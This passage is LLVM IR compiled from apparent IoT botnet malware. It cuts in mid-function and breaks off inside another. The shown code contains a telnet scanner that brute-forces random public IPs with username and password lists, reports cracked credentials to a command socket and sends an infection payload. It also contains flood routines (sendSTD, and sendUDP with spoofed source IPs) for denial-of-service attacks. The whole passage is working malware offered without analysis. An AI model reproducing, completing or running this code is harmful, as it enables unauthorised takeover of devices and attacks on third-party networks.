  %57 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 3
  %58 = load i8, i8* %57, align 1
  switch i8 %58, label %78 [
    i8 1, label %59
    i8 0, label %66
  ]

; <label>:59:                                     ; preds = %56
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 9
  %61 = bitcast i8** %60 to i64*
  %62 = load i64, i64* %61, align 8
  %63 = bitcast %struct.telstate_t* %47 to i8*
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 32, i32 16, i1 false)
  store i64 %62, i64* %61, align 8
  %64 = call i32 @GetRandomPublicIP()
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 1
  store i32 %64, i32* %65, align 4
  br label %78

; <label>:66:                                     ; preds = %56
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 5
  %68 = load i8, i8* %67, align 1
  %69 = add i8 %68, 1
  store i8 %69, i8* %67, align 1
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 4
  %71 = load i8, i8* %70, align 2
  %72 = add i8 %71, 1
  store i8 %72, i8* %70, align 2
  %73 = icmp eq i8 %69, 20
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %66
  store i8 1, i8* %57, align 1
  br label %308

; <label>:75:                                     ; preds = %66
  %76 = icmp eq i8 %72, 20
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %75
  store i8 1, i8* %57, align 1
  br label %308

; <label>:78:                                     ; preds = %56, %75, %59
  store i16 2, i16* %11, align 4
  store i16 %12, i16* %13, align 2
  store i64 0, i64* %15, align 4
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 1
  %80 = load i32, i32* %79, align 4
  store i32 %80, i32* %42, align 4
  %81 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %82 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  store i32 %81, i32* %82, align 16
  %83 = icmp eq i32 %81, -1
  br i1 %83, label %308, label %84

; <label>:84:                                     ; preds = %78
  %85 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 3, i8* null) #3
  %86 = or i32 %85, 2048
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 4, i32 %86) #3
  %88 = load i32, i32* %82, align 16
  %89 = call i32 @connect(i32 %88, %struct.sockaddr* nonnull %39, i32 16) #3
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %96

; <label>:91:                                     ; preds = %84
  %92 = tail call i32* @__errno_location() #18
  %93 = load i32, i32* %92, align 4
  %94 = icmp eq i32 %93, 115
  br i1 %94, label %96, label %95

; <label>:95:                                     ; preds = %91
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:96:                                     ; preds = %91, %84
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 1)
  br label %308

; <label>:97:                                     ; preds = %53
  %98 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %43) #3, !srcloc !7
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %100 = load i32, i32* %99, align 16
  %101 = srem i32 %100, 64
  %102 = zext i32 %101 to i64
  %103 = shl i64 1, %102
  %104 = sdiv i32 %100, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %3, i64 0, i32 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %103, %107
  store i64 %108, i64* %106, align 8
  store i64 0, i64* %40, align 8
  store i64 %44, i64* %41, align 8
  %109 = load i32, i32* %99, align 16
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* null, %struct.timeval* nonnull %4) #3
  switch i32 %111, label %124 [
    i32 1, label %112
    i32 -1, label %123
  ]

; <label>:112:                                    ; preds = %97
  store i32 4, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %113 = load i32, i32* %99, align 16
  %114 = call i32 @getsockopt(i32 %113, i32 1, i32 4, i8* nonnull %45, i32* nonnull %5) #3
  %115 = load i32, i32* %6, align 4
  %116 = icmp eq i32 %115, 0
  br i1 %116, label %118, label %117

; <label>:117:                                    ; preds = %112
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:118:                                    ; preds = %112
  %119 = load i32, i32* %99, align 16
  %120 = call i32 (i32, i32, ...) @fcntl(i32 %119, i32 3, i8* null) #3
  %121 = and i32 %120, -2049
  %122 = call i32 (i32, i32, ...) @fcntl(i32 %119, i32 4, i32 %121) #3
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 2)
  br label %308

; <label>:123:                                    ; preds = %97
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:124:                                    ; preds = %97
  %125 = load i32, i32* %48, align 16
  %126 = add i32 %125, 5
  %127 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %128 = icmp ult i32 %126, %127
  br i1 %128, label %129, label %308

; <label>:129:                                    ; preds = %124
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:130:                                    ; preds = %53
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %132 = load i32, i32* %131, align 16
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 9
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @read_until_response(i32 %132, i32 %0, i8* %134, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %143, label %137

; <label>:137:                                    ; preds = %130
  %138 = load i8*, i8** %133, align 8
  %139 = call i32 @contains_fail(i8* %138)
  %140 = icmp eq i32 %139, 0
  br i1 %140, label %142, label %141

; <label>:141:                                    ; preds = %137
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 0)
  br label %308

; <label>:142:                                    ; preds = %137
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 3)
  br label %308

; <label>:143:                                    ; preds = %130
  %144 = load i32, i32* %48, align 16
  %145 = add i32 %144, 7
  %146 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %147 = icmp ult i32 %145, %146
  br i1 %147, label %148, label %308

; <label>:148:                                    ; preds = %143
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:149:                                    ; preds = %53
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %151 = load i32, i32* %150, align 16
  %152 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 4
  %153 = load i8, i8* %152, align 2
  %154 = zext i8 %153 to i64
  %155 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %154
  %156 = load i8*, i8** %155, align 8
  %157 = call i64 @strlen(i8* %156) #15
  %158 = call i64 @send(i32 %151, i8* %156, i64 %157, i32 16384) #3
  %159 = icmp slt i64 %158, 0
  br i1 %159, label %160, label %161

; <label>:160:                                    ; preds = %149
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:161:                                    ; preds = %149
  %162 = load i32, i32* %150, align 16
  %163 = call i64 @send(i32 %162, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i64 0, i64 0), i64 2, i32 16384) #3
  %164 = icmp slt i64 %163, 0
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %161
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:166:                                    ; preds = %161
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 4)
  br label %308

; <label>:167:                                    ; preds = %53
  %168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %169 = load i32, i32* %168, align 16
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 9
  %171 = load i8*, i8** %170, align 8
  %172 = call i32 @read_until_response(i32 %169, i32 %0, i8* %171, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i64 0, i64 0))
  %173 = icmp eq i32 %172, 0
  br i1 %173, label %180, label %174

; <label>:174:                                    ; preds = %167
  %175 = load i8*, i8** %170, align 8
  %176 = call i32 @contains_fail(i8* %175)
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %179, label %178

; <label>:178:                                    ; preds = %174
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 0)
  br label %308

; <label>:179:                                    ; preds = %174
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 5)
  br label %308

; <label>:180:                                    ; preds = %167
  %181 = load i32, i32* %48, align 16
  %182 = add i32 %181, 3
  %183 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %184 = icmp ult i32 %182, %183
  br i1 %184, label %185, label %308

; <label>:185:                                    ; preds = %180
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:186:                                    ; preds = %53
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %188 = load i32, i32* %187, align 16
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 5
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i64
  %192 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %191
  %193 = load i8*, i8** %192, align 8
  %194 = call i64 @strlen(i8* %193) #15
  %195 = call i64 @send(i32 %188, i8* %193, i64 %194, i32 16384) #3
  %196 = icmp slt i64 %195, 0
  br i1 %196, label %197, label %198

; <label>:197:                                    ; preds = %186
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:198:                                    ; preds = %186
  %199 = load i32, i32* %187, align 16
  %200 = call i64 @send(i32 %199, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.137, i64 0, i64 0), i64 2, i32 16384) #3
  %201 = icmp slt i64 %200, 0
  br i1 %201, label %202, label %203

; <label>:202:                                    ; preds = %198
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:203:                                    ; preds = %198
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 6)
  br label %308

; <label>:204:                                    ; preds = %53
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 9
  %208 = load i8*, i8** %207, align 8
  %209 = call i32 @read_until_response(i32 %206, i32 %0, i8* %208, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i64 0, i64 0))
  %210 = icmp eq i32 %209, 0
  br i1 %210, label %241, label %211

; <label>:211:                                    ; preds = %204
  %212 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %212, i32* %48, align 16
  %213 = load i8*, i8** %207, align 8
  %214 = call i32 @contains_fail(i8* %213)
  %215 = icmp eq i32 %214, 0
  br i1 %215, label %217, label %216

; <label>:216:                                    ; preds = %211
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 0)
  br label %308

; <label>:217:                                    ; preds = %211
  %218 = load i8*, i8** %207, align 8
  %219 = call i32 @contains_success(i8* %218)
  %220 = icmp eq i32 %219, 0
  br i1 %220, label %240, label %221

; <label>:221:                                    ; preds = %217
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 3
  %223 = load i8, i8* %222, align 1
  %224 = icmp eq i8 %223, 2
  br i1 %224, label %225, label %226

; <label>:225:                                    ; preds = %221
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 7)
  br label %308

; <label>:226:                                    ; preds = %221
  %227 = load i32, i32* @mainCommSock, align 4
  %228 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %47)
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 4
  %230 = load i8, i8* %229, align 2
  %231 = zext i8 %230 to i64
  %232 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %231
  %233 = load i8*, i8** %232, align 8
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 5
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i64
  %237 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %236
  %238 = load i8*, i8** %237, align 8
  %239 = call i32 (i32, i8*, ...) @sockprintf(i32 %227, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.138, i64 0, i64 0), i8* %228, i8* %233, i8* %238)
  call void @advance_state(%struct.telstate_t* nonnull %47, i32 7)
  br label %308

; <label>:240:                                    ; preds = %217
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:241:                                    ; preds = %204
  %242 = load i32, i32* %48, align 16
  %243 = add i32 %242, 7
  %244 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %245 = icmp ult i32 %243, %244
  br i1 %245, label %246, label %308

; <label>:246:                                    ; preds = %241
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:247:                                    ; preds = %53
  %248 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  store i32 %248, i32* %48, align 16
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %47, i64 0, i32 0
  %250 = load i32, i32* %249, align 16
  %251 = call i64 @send(i32 %250, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i64 0, i64 0), i64 4, i32 16384) #3
  %252 = load i32, i32* %249, align 16
  %253 = call i64 @send(i32 %252, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.140, i64 0, i64 0), i64 7, i32 16384) #3
  %254 = load i32, i32* %249, align 16
  %255 = load i8*, i8** @infect, align 8
  %256 = call i64 @strlen(i8* %255) #15
  %257 = call i64 @send(i32 %254, i8* %255, i64 %256, i32 16384) #3
  %258 = icmp slt i64 %257, 0
  br i1 %258, label %259, label %273

; <label>:259:                                    ; preds = %247
  %260 = load i32, i32* @mainCommSock, align 4
  %261 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %47)
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 4
  %263 = load i8, i8* %262, align 2
  %264 = zext i8 %263 to i64
  %265 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %264
  %266 = load i8*, i8** %265, align 8
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 5
  %268 = load i8, i8* %267, align 1
  %269 = zext i8 %268 to i64
  %270 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %269
  %271 = load i8*, i8** %270, align 8
  %272 = call i32 (i32, i8*, ...) @sockprintf(i32 %260, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.141, i64 0, i64 0), i8* %261, i8* %266, i8* %271)
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:273:                                    ; preds = %247
  %274 = load i32, i32* %48, align 16
  %275 = add i32 %274, 25
  %276 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %277 = icmp ult i32 %275, %276
  br i1 %277, label %278, label %308

; <label>:278:                                    ; preds = %273
  %279 = load i32, i32* @mainCommSock, align 4
  %280 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %47)
  %281 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 4
  %282 = load i8, i8* %281, align 2
  %283 = zext i8 %282 to i64
  %284 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %283
  %285 = load i8*, i8** %284, align 8
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 5
  %287 = load i8, i8* %286, align 1
  %288 = zext i8 %287 to i64
  %289 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %288
  %290 = load i8*, i8** %289, align 8
  %291 = call i32 (i32, i8*, ...) @sockprintf(i32 %279, i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.142, i64 0, i64 0), i8* %280, i8* %285, i8* %290)
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i64 %46, i32 3
  %293 = load i8, i8* %292, align 1
  %294 = icmp eq i8 %293, 3
  br i1 %294, label %307, label %295

; <label>:295:                                    ; preds = %278
  %296 = load i32, i32* @mainCommSock, align 4
  %297 = call i8* @get_telstate_host(%struct.telstate_t* nonnull %47)
  %298 = load i8, i8* %281, align 2
  %299 = zext i8 %298 to i64
  %300 = getelementptr inbounds [20 x i8*], [20 x i8*]* @usernames, i64 0, i64 %299
  %301 = load i8*, i8** %300, align 8
  %302 = load i8, i8* %286, align 1
  %303 = zext i8 %302 to i64
  %304 = getelementptr inbounds [20 x i8*], [20 x i8*]* @passwords, i64 0, i64 %303
  %305 = load i8*, i8** %304, align 8
  %306 = call i32 (i32, i8*, ...) @sockprintf(i32 %296, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.143, i64 0, i64 0), i8* %297, i8* %301, i8* %305)
  br label %307

; <label>:307:                                    ; preds = %278, %295
  call void @reset_telstate(%struct.telstate_t* nonnull %47)
  br label %308

; <label>:308:                                    ; preds = %53, %166, %203, %96, %95, %129, %124, %148, %143, %185, %180, %246, %241, %307, %273, %216, %225, %226, %240, %178, %179, %141, %142, %117, %118, %78, %259, %202, %197, %165, %160, %123, %77, %74
  %309 = add nsw i32 %.1103, 1
  %310 = icmp slt i32 %309, %1
  %brmerge = or i1 %310, %38
  %.mux = select i1 %310, i32 %309, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %308
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

declare i32 @time(...) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #3

; Function Attrs: noinline noreturn nounwind uwtable
define void @sendSTD(i8*, i32, i32) local_unnamed_addr #12 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %6 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %7 = sext i32 %6 to i64
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #3
  %9 = bitcast %struct.sockaddr_in* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #3
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %42, %3
  %.0 = phi i32 [ 0, %3 ], [ %43, %42 ]
  %28 = call i32 @rand() #3
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %42

; <label>:30:                                     ; preds = %27
  %31 = sext i32 %28 to i64
  %32 = urem i64 %31, 36
  %33 = getelementptr inbounds [36 x i8*], [36 x i8*]* @sendSTD.randstrings, i64 0, i64 %32
  %34 = load i8*, i8** %33, align 8
  %35 = call i64 @send(i32 %5, i8* %34, i64 65, i32 0) #3
  %36 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #3
  %37 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %38 = sext i32 %37 to i64
  %39 = icmp slt i64 %38, %26
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %30
  %41 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #17
  unreachable

; <label>:42:                                     ; preds = %30, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %30 ]
  %43 = add i32 %.1, 1
  br label %27
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i32, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = icmp eq i32 %1, 0
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %8
  %14 = tail call i32 @rand_cmwc()
  %15 = trunc i32 %14 to i16
  br label %19

; <label>:16:                                     ; preds = %8
  %17 = trunc i32 %1 to i16
  %18 = tail call zeroext i16 @htons(i16 zeroext %17) #18
  br label %19

; <label>:19:                                     ; preds = %16, %13
  %.sink = phi i16 [ %18, %16 ], [ %15, %13 ]
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 1
  store i16 %.sink, i16* %20, align 2
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 2
  %22 = call i32 @getHost(i8* %0, %struct.in_addr* %21)
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %24, label %.loopexit

; <label>:24:                                     ; preds = %19
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i64 0, i32 3, i64 0
  %26 = bitcast i8* %25 to i64*
  store i64 0, i64* %26, align 4
  %27 = icmp eq i32 %3, 32
  br i1 %27, label %28, label %62

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %34

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %32, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %.loopexit

; <label>:34:                                     ; preds = %28
  %35 = add nsw i32 %4, 1
  %36 = sext i32 %35 to i64
  %37 = tail call noalias i8* @malloc(i64 %36) #3
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit, label %39

; <label>:39:                                     ; preds = %34
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %37, i8 0, i64 %36, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %37, i32 %4)
  %40 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %41 = add nsw i32 %40, %2
  %42 = sext i32 %4 to i64
  %43 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %44 = mul nsw i32 %7, 1000
  br label %.outer

.outer:                                           ; preds = %.outer.backedge, %39
  %.068.ph = phi i32 [ 0, %39 ], [ %.068.ph.be, %.outer.backedge ]
  %.067.ph = phi i32 [ 0, %39 ], [ %56, %.outer.backedge ]
  br label %45

; <label>:45:                                     ; preds = %.outer, %52
  %.067 = phi i32 [ 0, %52 ], [ %.067.ph, %.outer ]
  %46 = call i64 @sendto(i32 %29, i8* nonnull %37, i64 %42, i32 0, %struct.sockaddr* nonnull %43, i32 16) #3
  %47 = icmp eq i32 %.067, %5
  br i1 %47, label %48, label %55

; <label>:48:                                     ; preds = %45
  br i1 %12, label %49, label %52

; <label>:49:                                     ; preds = %48
  %50 = call i32 @rand_cmwc()
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %20, align 2
  br label %52

; <label>:52:                                     ; preds = %49, %48
  %53 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %54 = icmp sgt i32 %53, %41
  br i1 %54, label %.loopexit.loopexit, label %45

; <label>:55:                                     ; preds = %45
  %56 = add i32 %.067, 1
  %57 = icmp eq i32 %.068.ph, %6
  br i1 %57, label %58, label %60

; <label>:58:                                     ; preds = %55
  %59 = call i32 @usleep(i32 %44) #3
  br label %.outer.backedge

.outer.backedge:                                  ; preds = %58, %60
  %.068.ph.be = phi i32 [ %61, %60 ], [ 0, %58 ]
  br label %.outer

; <label>:60:                                     ; preds = %55
  %61 = add i32 %.068.ph, 1
  br label %.outer.backedge

; <label>:62:                                     ; preds = %24
  %63 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %68

; <label>:65:                                     ; preds = %62
  %66 = load i32, i32* @mainCommSock, align 4
  %67 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %66, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %.loopexit

; <label>:68:                                     ; preds = %62
  store i32 1, i32* %10, align 4
  %69 = bitcast i32* %10 to i8*
  %70 = call i32 @setsockopt(i32 %63, i32 0, i32 3, i8* nonnull %69, i32 4) #3
  %71 = icmp slt i32 %70, 0
  br i1 %71, label %72, label %.preheader.preheader

.preheader.preheader:                             ; preds = %68
  br label %.preheader

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @mainCommSock, align 4
  %74 = call i32 (i32, i8*, ...) @sockprintf(i32 %73, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.06974 = phi i32 [ %75, %.preheader ], [ 50, %.preheader.preheader ]
  %75 = add nsw i32 %.06974, -1
  %76 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %77 = call i32 @rand_cmwc()
  %78 = xor i32 %77, %76
  call void @srand(i32 %78) #3
  %79 = call i32 @rand() #3
  call void @init_rand(i32 %79)
  %80 = icmp eq i32 %75, 0
  br i1 %80, label %81, label %.preheader

; <label>:81:                                     ; preds = %.preheader
  %82 = icmp eq i32 %3, 0
  %83 = sub nsw i32 32, %3
  %84 = shl i32 -1, %83
  %.070 = select i1 %82, i32 0, i32 %84
  %85 = sext i32 %4 to i64
  %86 = add nsw i64 %85, 28
  %87 = call i8* @llvm.stacksave()
  %88 = alloca i8, i64 %86, align 16
  %89 = bitcast i8* %88 to %struct.iphdr*
  %90 = getelementptr i8, i8* %88, i64 20
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %21, i64 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @GetRandomIP(i32 %.070)
  %94 = call i32 @htonl(i32 %93) #18
  %95 = add nsw i64 %85, 8
  %96 = trunc i64 %95 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %89, i32 %92, i32 %94, i8 zeroext 17, i32 %96)
  %97 = trunc i64 %95 to i16
  %98 = call zeroext i16 @htons(i16 zeroext %97) #18
  %99 = getelementptr inbounds i8, i8* %88, i64 24
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 8
  %101 = call i32 @rand_cmwc()
  %102 = trunc i32 %101 to i16
  %103 = bitcast i8* %90 to i16*
  store i16 %102, i16* %103, align 4
  br i1 %12, label %104, label %106

; <label>:104:                                    ; preds = %81
  %105 = call i32 @rand_cmwc()
  br label %110

; <label>:106:                                    ; preds = %81
  %107 = trunc i32 %1 to i16
  %108 = call zeroext i16 @htons(i16 zeroext %107) #18
  %109 = zext i16 %108 to i32
  br label %110

; <label>:110:                                    ; preds = %106, %104
  %111 = phi i32 [ %105, %104 ], [ %109, %106 ]
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds i8, i8* %88, i64 22
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 2
  %115 = getelementptr inbounds i8, i8* %88, i64 26
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  %117 = getelementptr inbounds i8, i8* %88, i64 28
  call void @makeRandomStr(i8* %117, i32 %4)
  %118 = bitcast i8* %88 to i16*
  %119 = getelementptr inbounds i8, i8* %88, i64 2
  %120 = bitcast i8* %119 to i16*
  %121 = load i16, i16* %120, align 2
  %122 = zext i16 %121 to i32
  %123 = call zeroext i16 @csum(i16* nonnull %118, i32 %122)
  %124 = getelementptr inbounds i8, i8* %88, i64 10
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  %126 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
